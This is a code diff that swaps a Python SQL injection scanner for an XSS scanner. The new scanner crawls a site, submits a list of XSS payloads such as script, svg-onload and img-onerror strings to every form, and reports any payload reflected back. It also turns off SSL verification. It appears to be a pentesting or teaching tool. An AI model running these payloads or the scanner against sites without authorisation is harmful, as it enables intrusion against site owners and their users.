@@ -1,128 +1,202 @@
-import requests
-from bs4 import BeautifulSoup as bs
-from urllib.parse import urljoin
-from pprint import pprint
-import argparse
+import requests  # Importing requests library for making HTTP requests
+from pprint import pprint  # Importing pprint for pretty-printing data structures
+from bs4 import BeautifulSoup as bs  # Importing BeautifulSoup for HTML parsing
+from urllib.parse import urljoin, urlparse  # Importing utilities for URL manipulation
+from urllib.robotparser import RobotFileParser  # Importing RobotFileParser for parsing robots.txt files
+from colorama import Fore, Style  # Importing colorama for colored terminal output
+import argparse  # Importing argparse for command-line argument parsing
+import urllib3  # Importing urllib3 to suppress warnings
 
-# Initialize an HTTP session & set the browser
-s = requests.Session()
-s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# List of XSS payloads to test forms with
+XSS_PAYLOADS = [
+    '"><svg/onload=alert(1)>',
+    '\'><svg/onload=alert(1)>',
+    '<img src=x onerror=alert(1)>',
+    '"><img src=x onerror=alert(1)>',
+    '\'><img src=x onerror=alert(1)>',
+    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//--></script>",
+    "<Script>alert('XSS')</scripT>",
+    "<script>alert(document.cookie)</script>",
+]
+
+# Global variable to store all crawled links
+crawled_links = set()
+
+def print_crawled_links():
+    """
+    Print all crawled links
+    """
+    print(f"\n[+] Links crawled:")
+    for link in crawled_links:
+        print(f"    {link}")
+    print()
 
 def get_all_forms(url):
     """Given a `url`, it returns all forms from the HTML content"""
-    soup = bs(s.get(url).content, "html.parser")
-    return soup.find_all("form")
-
+    try:
+        # Using BeautifulSoup to parse HTML content of the URL
+        soup = bs(requests.get(url, verify=False).content, "html.parser")  # Ignore SSL cert verification
+        # Finding all form elements in the HTML
+        return soup.find_all("form")
+    except requests.exceptions.RequestException as e:
+        # Handling exceptions if there's an error in retrieving forms
+        print(f"[-] Error retrieving forms from {url}: {e}")
+        return []
 
 def get_form_details(form):
-    """
-    This function extracts all possible useful information about an HTML `form`
-    """
+    """This function extracts all possible useful information about an HTML `form`"""
     details = {}
-    # Get the form action (target URL)
-    try:
-        action = form.attrs.get("action").lower()
-    except:
-        action = None
-    # Get the form method (POST, GET, etc.)
+    # Extracting form action and method
+    action = form.attrs.get("action", "").lower()
     method = form.attrs.get("method", "get").lower()
-    # Get all the input details such as type and name
     inputs = []
+    # Extracting input details within the form
     for input_tag in form.find_all("input"):
         input_type = input_tag.attrs.get("type", "text")
         input_name = input_tag.attrs.get("name")
-        input_value = input_tag.attrs.get("value", "")
-        inputs.append({"type": input_type, "name": input_name, "value": input_value})
-    # Put everything into the resulting dictionary
+        inputs.append({"type": input_type, "name": input_name})
+    # Storing form details in a dictionary
     details["action"] = action
     details["method"] = method
     details["inputs"] = inputs
     return details
 
+def submit_form(form_details, url, value):
+    """Submits a form given in `form_details`
+    Params:
+    form_details (list): a dictionary that contains form information
+    url (str): the original URL that contains that form
+    value (str): this will be replaced for all text and search inputs
+    Returns the HTTP Response after form submission"""
+    target_url = urljoin(url, form_details["action"])  # Constructing the absolute form action URL
+    inputs = form_details["inputs"]
+    data = {}
+    # Filling form inputs with the provided value
+    for input in inputs:
+        if input["type"] == "text" or input["type"] == "search":
+            input["value"] = value
+        input_name = input.get("name")
+        input_value = input.get("value")
+        if input_name and input_value:
+            data[input_name] = input_value
+    try:
+        # Making the HTTP request based on the form method (POST or GET)
+        if form_details["method"] == "post":
+            return requests.post(target_url, data=data, verify=False)  # Ignore SSL cert verification
+        else:
+            return requests.get(target_url, params=data, verify=False)  # Ignore SSL cert verification
+    except requests.exceptions.RequestException as e:
+        # Handling exceptions if there's an error in form submission
+        print(f"[-] Error submitting form to {target_url}: {e}")
+        return None
 
-def is_vulnerable(response):
-    """A simple boolean function that determines whether a page 
-    is SQL Injection vulnerable from its `response`"""
-    errors = {
-        # MySQL
-        "you have an error in your sql syntax;",
-        "warning: mysql",
-        # SQL Server
-        "unclosed quotation mark after the character string",
-        # Oracle
-        "quoted string not properly terminated",
-    }
-    for error in errors:
-        # If you find one of these errors, return True
-        if error in response.content.decode().lower():
-            return True
-    # No error detected
-    return False
+def get_all_links(url):
+    """
+    Given a `url`, it returns all links from the HTML content
+    """
+    try:
+        # Using BeautifulSoup to parse HTML content of the URL
+        soup = bs(requests.get(url, verify=False).content, "html.parser")  # Ignore SSL cert verification
+        # Finding all anchor elements in the HTML
+        return [urljoin(url, link.get("href")) for link in soup.find_all("a")]
+    except requests.exceptions.RequestException as e:
+        # Handling exceptions if there's an error in retrieving links
+        print(f"[-] Error retrieving links from {url}: {e}")
+        return []
 
-
-def scan_sql_injection(url):
-    # Test on URL (only append quotes to the parameters, not the base URL)
-    for c in "\"'":
-        # Check if the URL has query parameters
-        if '?' in url:
-            new_url = f"{url}{c}"
-            print("[!] Trying", new_url)
-            try:
-                res = s.get(new_url)
-                if is_vulnerable(res):
-                    print("[+] SQL Injection vulnerability detected, link:", new_url)
-                    return
-            except requests.exceptions.RequestException as e:
-                print(f"Error occurred: {e}")
-                continue
-
-    # Test on HTML forms
-    forms = get_all_forms(url)
-    print(f"[+] Detected {len(forms)} forms on {url}.")
-    for form in forms:
-        form_details = get_form_details(form)
-        for c in "\"'":
-            # The data body we want to submit
-            data = {}
-            for input_tag in form_details["inputs"]:
-                if input_tag["type"] == "hidden" or input_tag["value"]:
-                    # Any input form that is hidden or has some value,
-                    # just use it in the form body
-                    try:
-                        data[input_tag["name"]] = input_tag["value"] + c
-                    except:
-                        pass
-                elif input_tag["type"] != "submit":
-                    # All others except submit, use some junk data with special character
-                    data[input_tag["name"]] = f"test{c}"
-            
-            # Join the URL with the action (form request URL)
-            action_url = urljoin(url, form_details["action"])
-            try:
-                if form_details["method"] == "post":
-                    res = s.post(action_url, data=data)
-                elif form_details["method"] == "get":
-                    res = s.get(action_url, params=data)
-            
-                # Test whether the resulting page is vulnerable
-                if is_vulnerable(res):
-                    print("[+] SQL Injection vulnerability detected, link:", action_url)
-                    print("[+] Form:")
+def scan_xss(args, scanned_urls=None):
+    """Given a `url`, it prints all XSS vulnerable forms and
+    returns True if any is vulnerable, None if already scanned, False otherwise"""
+    global crawled_links
+    if scanned_urls is None:
+        scanned_urls = set()
+    
+    # Checking if the URL is already scanned
+    if args.url in scanned_urls:
+        return False
+    # Adding the URL to the scanned URLs set
+    scanned_urls.add(args.url)
+    
+    # Getting all forms from the given URL
+    forms = get_all_forms(args.url)
+    print(f"\n[+] Detected {len(forms)} forms on {args.url}")
+    
+    # Parsing the URL to get the domain
+    parsed_url = urlparse(args.url)
+    domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
+    
+    if args.obey_robots:
+        robot_parser = RobotFileParser()
+        robot_parser.set_url(urljoin(domain, "/robots.txt"))
+        try:
+            robot_parser.read()
+        except Exception as e:
+            # Handling exceptions if there's an error in reading robots.txt
+            print(f"[-] Error reading robots.txt file for {domain}: {e}")
+            crawl_allowed = False
+        else:
+            crawl_allowed = robot_parser.can_fetch("*", args.url)
+    else:
+        crawl_allowed = True
+    
+    if crawl_allowed or parsed_url.path:
+        for form in forms:
+            form_details = get_form_details(form)
+            form_vulnerable = False
+            # Testing each form with XSS payloads
+            for payload in XSS_PAYLOADS:
+                response = submit_form(form_details, args.url, payload)
+                if response and payload in response.content.decode():
+                    print(f"\n{Fore.GREEN}[+] XSS Vulnerability Detected on {args.url}{Style.RESET_ALL}")
+                    print(f"[*] Form Details:")
                     pprint(form_details)
-                    break
-            except requests.exceptions.RequestException as e:
-                print(f"Error occurred during form submission: {e}")
-                continue
-
-
-def main():
-    parser = argparse.ArgumentParser(description="SQL Injection Scanner")
-    parser.add_argument("-u", "--url", type=str, required=True, help="URL to scan for SQL injection vulnerabilities")
-    args = parser.parse_args()
-
-    print(f"[*] Scanning {args.url} for SQL Injection vulnerabilities...")
-    scan_sql_injection(args.url)
-
+                    print(f"{Fore.YELLOW}[*] Payload: {payload} {Style.RESET_ALL}")
+                    # save to a file if output file is provided
+                    if args.output:
+                        with open(args.output, "a") as f:
+                            f.write(f"URL: {args.url}\n")
+                            f.write(f"Form Details: {form_details}\n")
+                            f.write(f"Payload: {payload}\n")
+                            f.write("-"*50 + "\n\n")
+                    form_vulnerable = True
+                    break  # No need to try other payloads for this endpoint
+            
+            if not form_vulnerable:
+                print(f"{Fore.MAGENTA}[-] No XSS vulnerability found on {args.url}{Style.RESET_ALL}")
+    
+    # Crawl links if the option is enabled
+    if args.crawl:
+        print(f"\n[+] Crawling links from {args.url}")
+        try:
+            # Crawling links from the given URL
+            links = get_all_links(args.url)
+        except requests.exceptions.RequestException as e:
+            # Handling exceptions if there's an error in crawling links
+            print(f"[-] Error crawling links from {args.url}: {e}")
+            links = []
+        for link in set(links):  # Removing duplicates
+            if link.startswith(domain):
+                crawled_links.add(link)
+                if args.max_links and len(crawled_links) >= args.max_links:
+                    print(f"{Fore.CYAN}[-] Maximum links ({args.max_links}) limit reached. Exiting...{Style.RESET_ALL}")
+                    print_crawled_links()
+                    exit(0)
+                # Recursively scanning XSS vulnerabilities for crawled links
+                args.url = link
+                scan_xss(args, scanned_urls)
 
 if __name__ == "__main__":
-    main()
+    parser = argparse.ArgumentParser(description="Extended XSS Vulnerability scanner script.")
+    parser.add_argument("url", help="URL to scan for XSS vulnerabilities")
+    parser.add_argument("-c", "--crawl", action="store_true", help="Crawl links from the given URL")
+    # max visited links
+    parser.add_argument("-m", "--max-links", type=int, default=0, help="Maximum number of links to visit. Default 0, which means no limit.")
+    parser.add_argument("--obey-robots", action="store_true", help="Obey robots.txt rules")
+    parser.add_argument("-o", "--output", help="Output file to save the results")
+    args = parser.parse_args()
+    scan_xss(args)  # Initiating XSS vulnerability scan
+
+    print_crawled_links()
